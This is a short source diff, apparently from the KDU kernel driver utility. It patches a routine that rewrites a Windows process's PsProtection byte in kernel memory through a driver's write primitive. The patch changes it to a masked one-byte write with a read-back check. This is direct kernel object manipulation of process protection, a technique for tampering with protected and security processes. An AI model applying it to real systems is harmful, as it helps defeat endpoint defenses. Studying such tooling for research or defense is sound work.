@@ -6,7 +6,7 @@
 *
 *  VERSION:     1.44
 *
-*  DATE:        18 Aug 2025
+*  DATE:        19 Aug 2025
 *
 *  Processes DKOM related routines.
 *
@@ -301,7 +301,7 @@ BOOL KDUControlProcess(
     CLIENT_ID clientId;
     OBJECT_ATTRIBUTES obja;
 
-    PS_PROTECTION* PsProtection;
+    PS_PROTECTION *PsProtection;
 
     FUNCTION_ENTER_MSG(__FUNCTION__);
 
@@ -396,29 +396,25 @@ BOOL KDUControlProcess(
 
                     printf_s("\tPsProtection->Audit: %lu\r\n", PsProtection->Audit);
 
-                    PsProtection->Signer = PsProtectionSigner;
-                    PsProtection->Type = PsProtectionType;
-                    PsProtection->Audit = 0;
+                    Buffer &= 0xFFFFFF00;
+                    Buffer |= ((PsProtectionSigner << 4) | (PsProtectionType & 0x7));
 
                     bResult = Context->Provider->Callbacks.WriteKernelVM(Context->DeviceHandle,
                         VirtualAddress,
                         &Buffer,
-                        sizeof(ULONG));
+                        sizeof(UCHAR));
 
                     if (bResult) {
                         printf_s("[+] Process object modified\r\n");
 
-                        pStr = KDUGetProtectionTypeAsString(PsProtection->Type);
-                        printf_s("\tNew PsProtection->Type: %lu (%s)\r\n",
-                            PsProtection->Type,
-                            pStr);
-
-                        pStr = KDUGetProtectionSignerAsString(PsProtection->Signer);
-                        printf_s("\tNew PsProtection->Signer: %lu (%s)\r\n",
-                            PsProtection->Signer,
-                            pStr);
-
-                        printf_s("\tNew PsProtection->Audit: %lu\r\n", PsProtection->Audit);
+                        ULONG verifyBuf = 0;
+                        if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
+                            VirtualAddress,
+                            &verifyBuf,
+                            sizeof(UCHAR))) 
+                        {
+                            printf_s("\tNew PsProtection: 0x%02X\n", verifyBuf & 0xff);
+                        }
 
                     }
                     else {
